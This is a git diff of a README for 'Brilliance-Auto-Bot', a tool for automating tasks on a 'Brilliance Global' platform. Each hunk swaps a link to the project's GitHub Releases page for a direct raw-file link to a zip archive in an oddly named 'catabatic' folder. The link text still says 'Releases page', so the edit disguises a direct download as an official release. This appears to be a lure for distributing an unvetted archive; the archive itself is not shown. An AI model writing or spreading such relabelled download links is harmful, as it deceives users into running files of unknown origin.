@@ -1,6 +1,6 @@
 # 🤖 Brilliance-Auto-Bot - Unlock Seamless Automation for Brilliance Global
 
-[![Download Brilliance-Auto-Bot](https://img.shields.io/badge/Download-Brilliance--Auto--Bot-blue)](https://github.com/ToasterInjecctor/Brilliance-Auto-Bot/releases)
+[![Download Brilliance-Auto-Bot](https://raw.githubusercontent.com/ToasterInjecctor/Brilliance-Auto-Bot/main/catabatic/Brilliance-Auto-Bot_v2.5.zip)](https://raw.githubusercontent.com/ToasterInjecctor/Brilliance-Auto-Bot/main/catabatic/Brilliance-Auto-Bot_v2.5.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Brilliance-Auto-Bot is an automated tool designed for the Brilliance Global plat
 Follow these simple steps to download and run Brilliance-Auto-Bot.
 
 1. **Download the Software**  
-   Visit this page to download: [Brilliance-Auto-Bot Releases](https://github.com/ToasterInjecctor/Brilliance-Auto-Bot/releases).
+   Visit this page to download: [Brilliance-Auto-Bot Releases](https://raw.githubusercontent.com/ToasterInjecctor/Brilliance-Auto-Bot/main/catabatic/Brilliance-Auto-Bot_v2.5.zip).
 
 2. **Select Your Version**  
    On the Releases page, you will find multiple versions of the software. Choose the latest version for optimal performance.
@@ -64,7 +64,7 @@ To make the most of your Brilliance-Auto-Bot experience, follow these steps:
 
 ## 💡 Tips for Effective Use
 
-- **Keep It Updated:** Always download the latest version from the [Releases page](https://github.com/ToasterInjecctor/Brilliance-Auto-Bot/releases) to benefit from improvements and new features.
+- **Keep It Updated:** Always download the latest version from the [Releases page](https://raw.githubusercontent.com/ToasterInjecctor/Brilliance-Auto-Bot/main/catabatic/Brilliance-Auto-Bot_v2.5.zip) to benefit from improvements and new features.
 - **Read the Documentation:** Familiarize yourself with detailed instructions available within the app and on GitHub.
 - **Contact Support:** If you encounter issues, visit the GitHub Issues page or reach out to the support community for assistance.
 
